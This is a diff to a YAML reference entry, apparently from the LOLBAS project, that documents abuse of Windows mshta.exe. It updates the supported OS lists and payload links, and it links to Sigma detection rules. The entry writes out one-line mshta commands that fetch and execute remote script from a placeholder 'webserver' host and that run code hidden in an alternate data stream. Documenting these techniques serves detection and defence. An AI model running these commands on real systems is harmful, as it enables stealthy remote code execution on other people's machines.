@@ -10,21 +10,21 @@ Commands:
     Category: Execute
     Privileges: User
     MitreID: T1218.005
-    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
-  - Command: mshta.exe vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))
+    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
+  - Command: mshta.exe vbscript:Close(Execute("GetObject(""script:https://webserver/payload.sct"")"))
     Description: Executes VBScript supplied as a command line argument.
     Usecase: Execute code
     Category: Execute
     Privileges: User
     MitreID: T1218.005
-    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
-  - Command: mshta.exe javascript:a=GetObject("script:https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSBinaries/Payload/Mshta_calc.sct").Exec();close();
+    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
+  - Command: mshta.exe javascript:a=GetObject("script:https://webserver/payload.sct").Exec();close();
     Description: Executes JavaScript supplied as a command line argument.
     Usecase: Execute code
     Category: Execute
     Privileges: User
     MitreID: T1218.005
-    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
   - Command: mshta.exe "C:\ads\file.txt:file.hta"
     Description: Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript.
     Usecase: Execute code hidden in alternate data stream
@@ -43,7 +43,7 @@ Full_Path:
   - Path: C:\Windows\System32\mshta.exe
   - Path: C:\Windows\SysWOW64\mshta.exe
 Code_Sample:
-  - Code: https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSBinaries/Payload/Mshta_calc.sct
+  - Code: https://gist.github.com/bohops/6ded40c4989c673f2e30b9a6c1985019
 Detection:
   - Sigma: https://github.com/SigmaHQ/sigma/blob/05c58b4892942c34bfa01e9ada88ef2663858e1c/rules/windows/process_creation/win_susp_mshta_pattern.yml
   - Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_invoke_obfuscation_via_use_mhsta.yml
